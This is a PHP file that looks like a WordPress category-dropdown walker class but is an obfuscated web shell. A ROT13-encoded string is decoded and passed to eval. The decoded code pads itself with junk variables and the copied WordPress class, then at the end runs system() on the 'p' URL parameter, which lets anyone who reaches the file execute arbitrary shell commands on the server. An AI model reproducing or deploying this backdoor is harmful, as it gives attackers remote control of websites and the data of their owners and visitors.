<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gnkbabzl NCV: Jnyxre_PngrtbelQebcqbja pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb perngr na UGZY qebcqbja yvfg bs Pngrtbevrf.
 *
 * @fvapr 2.1.0
 *
 * @frr Jnyxre
 */
pynff Jnyxre_PngrtbelQebcqbja rkgraqf Jnyxre {

	/**
	 * Jung gur pynff unaqyrf.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat
	 *
	 * @frr Jnyxre::$gerr_glcr
	 */
	choyvp $gerr_glcr = 'pngrtbel';

	/**
	 * Qngnonfr svryqf gb hfr.
	 *
	 * @fvapr 2.1.0
	 * @gbqb Qrpbhcyr guvf
	 * @ine fgevat[]
	 *
	 * @frr Jnyxre::$qo_svryqf
	 */
	choyvp $qo_svryqf = neenl(
		'cnerag' => 'cnerag',
		'vq'     => 'grez_vq',
	);

	/**
	 * Fgnegf gur ryrzrag bhgchg.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.9.0 Eranzrq `$pngrtbel` gb `$qngn_bowrpg` naq `$vq` gb `$pheerag_bowrpg_vq`
	 *              gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @frr Jnyxre::fgneg_ry()
	 *
	 * @cnenz fgevat  $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz JC_Grez $qngn_bowrpg       Pngrtbel qngn bowrpg.
	 * @cnenz vag     $qrcgu             Qrcgu bs pngrtbel. Hfrq sbe cnqqvat.
	 * @cnenz neenl   $netf              Hfrf 'fryrpgrq', 'fubj_pbhag', naq 'inyhr_svryq' xrlf, vs gurl rkvfg.
	 *                                   Frr jc_qebcqbja_pngrtbevrf().
	 * @cnenz vag     $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag pngrtbel. Qrsnhyg 0.
	 */
	choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl(), $pheerag_bowrpg_vq = 0 ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pngrtbel = $qngn_bowrpg;

		$cnq = fge_ercrng( '&aofc;', $qrcgu * 3 );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pngrtbel-grzcyngr.cuc */
		$png_anzr = nccyl_svygref( 'yvfg_pngf', $pngrtbel->anzr, $pngrtbel );

		vs ( vffrg( $netf['inyhr_svryq'] ) && vffrg( $pngrtbel->{$netf['inyhr_svryq']} ) ) {
			$inyhr_svryq = $netf['inyhr_svryq'];
		} ryfr {
			$inyhr_svryq = 'grez_vq';
		}

		$bhgchg .= \"\g<bcgvba pynff=\\"yriry-$qrcgu\\" inyhr=\\"\" . rfp_ngge( $pngrtbel->{$inyhr_svryq} ) . '\"';

		// Glcr-whttyvat pnhfrf snyfr zngpurf, fb jr sbepr rirelguvat gb n fgevat.
		vs ( (fgevat) $pngrtbel->{$inyhr_svryq} === (fgevat) $netf['fryrpgrq'] ) {
			$bhgchg .= ' fryrpgrq=\"fryrpgrq\"';
		}
		$bhgchg .= '>';
		$bhgchg .= $cnq . $png_anzr;
		vs ( $netf['fubj_pbhag'] ) {
			$bhgchg .= '&aofc;&aofc;(' . ahzore_sbezng_v18a( $pngrtbel->pbhag ) . ')';
		}
		$bhgchg .= \"</bcgvba>\a\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>